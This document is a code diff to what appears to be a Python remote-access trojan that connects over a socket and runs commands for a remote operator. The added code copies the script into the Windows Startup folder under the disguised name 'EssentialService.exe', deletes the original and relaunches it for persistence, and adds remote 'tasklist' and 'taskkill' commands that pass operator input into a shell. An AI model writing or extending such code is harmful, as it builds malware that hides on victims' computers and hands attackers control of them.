@@ -1,6 +1,5 @@
 import socket
 import os
-from uuid import uuid4
 import subprocess
 import platform
 import pyautogui
@@ -9,6 +8,24 @@ import cv2
 
 ADDR = socket.gethostbyname(socket.gethostname())
 PORT = 80
+
+NEW_FILE_NAME = 'EssentialService.exe'
+
+STARTUP_PATH_ON_DEVICE = os.path.join(os.getenv('APPDATA'),  r'Microsoft\Windows\Start Menu\Programs\Startup')
+
+CURRENT_PATH_TO_FILE = os.path.dirname(__file__)
+
+if STARTUP_PATH_ON_DEVICE != CURRENT_PATH_TO_FILE:
+
+    with open(os.path.join(CURRENT_PATH_TO_FILE, __file__), 'rb') as f:
+        fileData = f.read()
+
+    with open(os.path.join(STARTUP_PATH_ON_DEVICE, NEW_FILE_NAME), 'wb') as f:
+        f.write(fileData)
+    
+    os.remove(os.path.join(CURRENT_PATH_TO_FILE, __file__))
+    os.startfile(os.path.join(STARTUP_PATH_ON_DEVICE, NEW_FILE_NAME))
+    sys.exit()
 
 os.chdir(os.getenv('USERPROFILE'))
 
@@ -213,6 +230,21 @@ while True:
                     try:
                         sysInfo = subprocess.check_output('fsutil fsinfo drives', shell = True)
                         s.send(getSendableMsg(sysInfo.decode()))
+                    except:
+                        s.send(getSendableMsg('ERROR'))
+
+                elif command == 'tasklist':
+                    try:
+                        tasklist = subprocess.check_output('TASKLIST', shell = True)
+                        s.send(getSendableMsg(tasklist.decode()))
+                    except:
+                        s.send(getSendableMsg('ERROR'))
+                
+                elif command == 'taskkill':
+                    try:
+                        taskname = recvall(s)
+                        result = subprocess.check_output(f'TASKKILL /IM {taskname}', shell = True)
+                        s.send(getSendableMsg(result.decode()))
                     except:
                         s.send(getSendableMsg('ERROR'))
 
